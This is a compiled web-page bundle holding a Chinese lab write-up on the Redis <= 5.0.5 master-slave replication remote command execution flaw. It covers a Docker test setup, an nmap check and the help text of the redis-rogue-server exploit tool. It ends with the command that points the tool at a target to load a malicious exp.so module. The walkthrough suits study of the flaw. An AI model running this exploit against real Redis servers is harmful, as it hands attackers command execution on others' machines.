{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[283],{1113:function(t,s,a){t.exports=a.p+\"assets/img/image-20220309231916165.e64b03c2.png\"},1114:function(t,s,a){t.exports=a.p+\"assets/img/image-20220309231926604.6bd821d6.png\"},1932:function(t,s,a){\"use strict\";a.r(s);var e=a(56),r=Object(e.a)({},(function(){var t=this,s=t.$createElement,e=t._self._c||s;return e(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":t.$parent.slotKey}},[e(\"h1\",{attrs:{id:\"redis-小于5-0-5-主从复制远程命令执行漏洞\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis-小于5-0-5-主从复制远程命令执行漏洞\"}},[t._v(\"#\")]),t._v(\" Redis 小于5.0.5 主从复制远程命令执行漏洞\")]),t._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞描述\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[t._v(\"#\")]),t._v(\" 漏洞描述\")]),t._v(\" \"),e(\"p\",[t._v(\"在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大\")]),t._v(\" \"),e(\"p\",[e(\"a\",{attrs:{href:\"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf\",target:\"_blank\",rel:\"noopener noreferrer\"}},[t._v(\"Pavel Toporkov的分享\"),e(\"OutboundLink\")],1)]),t._v(\" \"),e(\"h2\",{attrs:{id:\"影响版本\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#影响版本\"}},[t._v(\"#\")]),t._v(\" 影响版本\")]),t._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"Redis <= 5.0.5\")]),e(\"br\"),t._v(\" \"),e(\"h2\",{attrs:{id:\"环境搭建\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#环境搭建\"}},[t._v(\"#\")]),t._v(\" 环境搭建\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-shell extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[e(\"code\",[e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"docker\")]),t._v(\" pull damonevking/redis5.0 \\n\"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"docker\")]),t._v(\" run -p \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"6379\")]),t._v(\":6379 -d damonevking/redis5.0 redis-server\\n\")])])]),e(\"p\",[t._v(\"nmap扫描一下6379端口开放即为搭建成功\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-shell extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[e(\"code\",[t._v(\"root@kali:~/桌面\"),e(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[t._v(\"# docker pull damonevking/redis5.0 \")]),t._v(\"\\nUsing default tag: latest\\n\\nlatest: Pulling from damonevking/redis5.0\\nfc7181108d40: Pull complete \\n3e0ac67cad82: Pull complete \\n6ee495cb7235: Pull complete \\n9f7206d08b9d: Pull complete \\na8354ef8cccb: Pull complete \\n53afb10d81c2: Pull complete \\nDigest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f\\nStatus: Downloaded newer image \"),e(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"for\")]),t._v(\" damonevking/redis5.0:latest\\ndocker.io/damonevking/redis5.0:latest\\nroot@kali:~/桌面\"),e(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[t._v(\"# docker run -p 6379:6379 -d damonevking/redis5.0 redis-server\")]),t._v(\"\\n1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12\\nroot@kali:~/桌面\"),e(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[t._v(\"# nmap 127.0.0.1 -p 6379\")]),t._v(\"\\nStarting Nmap \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"7.80\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),t._v(\" https://nmap.org \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\" at \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"2020\")]),t._v(\"-12-08 \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"21\")]),t._v(\":47 CST\\nNmap scan report \"),e(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"for\")]),t._v(\" localhost \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"127.0\")]),t._v(\".0.1\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\"\\nHost is up \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"0\")]),t._v(\".000099s latency\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\".\\n\\nPORT     STATE SERVICE\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"6379\")]),t._v(\"/tcp \"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"open\")]),t._v(\"  redis\\n\\nNmap done: \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1\")]),t._v(\" IP address \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"host\")]),t._v(\" up\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\" scanned \"),e(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"in\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"0.10\")]),t._v(\" seconds\\n\")])])]),e(\"h2\",{attrs:{id:\"漏洞复现\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[t._v(\"#\")]),t._v(\" 漏洞复现\")]),t._v(\" \"),e(\"p\",[t._v(\"关于漏洞原理请查看\"),e(\"a\",{attrs:{href:\"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf\",target:\"_blank\",rel:\"noopener noreferrer\"}},[t._v(\"Pavel Toporkov的分享\"),e(\"OutboundLink\")],1)]),t._v(\" \"),e(\"p\",[t._v(\"漏洞利用脚本: \"),e(\"a\",{attrs:{href:\"https://github.com/n0b0dyCN/redis-rogue-server\",target:\"_blank\",rel:\"noopener noreferrer\"}},[t._v(\"n0b0dyCN/redis-rogue-server\"),e(\"OutboundLink\")],1)]),t._v(\" \"),e(\"div\",{staticClass:\"language-shell extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[e(\"code\",[t._v(\"➜ ./redis-rogue-server.py -h\\n______         _ _      ______                         _____                          \\n\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" ___ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"       \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\"     \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" ___ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"                       /  ___\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"                         \\n\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"_/ /___  __\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"_ ___  \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"_/ /___   __ _ _   _  ___  \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[e(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"`\")]),t._v(\"--.  ___ _ ____   _____ _ __ \\n\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"    // _ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"/ _\"),e(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"`\")])]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" / __\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"    // _ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\" / _\"),e(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[e(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"`\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"/ _ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"  \"),e(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"`\")])]),t._v(\"--. \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"/ _ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v(\"'__\\\\ \\\\ / / _ \\\\ '\")]),t._v(\"__\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"  __/ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"__ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"  __/ /\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"__/ /  __/ \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"   \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\" V /  __/ \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"   \\n\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"___\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"__,_\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"___/ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"___/ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"__, \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"__,_\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"___\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"____/ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"___\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"    \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"_/ \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),t._v(\"___\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"_\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"   \\n                                     __/ \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"                                            \\n                                    \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\"___/                                             \\n@copyright n0b0dy @ r3kapig\\n\\nUsage: redis-rogue-server.py \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"[\")]),t._v(\"options\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"]\")]),t._v(\"\\n\\nOptions:\\n  -h, --help           show this \"),e(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[t._v(\"help\")]),t._v(\" message and \"),e(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[t._v(\"exit\")]),t._v(\"\\n  --rhost\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"REMOTE_HOST  target \"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"host\")]),t._v(\"\\n  --rport\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"REMOTE_PORT  target redis port, default \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"6379\")]),t._v(\"\\n  --lhost\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"LOCAL_HOST   rogue server \"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"ip\")]),t._v(\"\\n  --lport\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"LOCAL_PORT   rogue server listen port, default \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"21000\")]),t._v(\"\\n  --exp\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"EXP_FILE       Redis Module to load, default exp.so\\n  -v, --verbose        Show full data stream\\nExample\\n\")])])]),e(\"p\",[e(\"img\",{attrs:{src:a(1113),alt:\"image-20220309231916165\"}})]),t._v(\" \"),e(\"div\",{staticClass:\"language-shell extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[e(\"code\",[t._v(\"python3 redis-rogue-server.py --rhost \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"192.168\")]),t._v(\".51.146 --lhost \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"192.168\")]),t._v(\".51.146 --exp\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"exp.so\\n\")])])]),e(\"p\",[e(\"img\",{attrs:{src:a(1114),alt:\"image-20220309231926604\"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);","extractedComments":[]}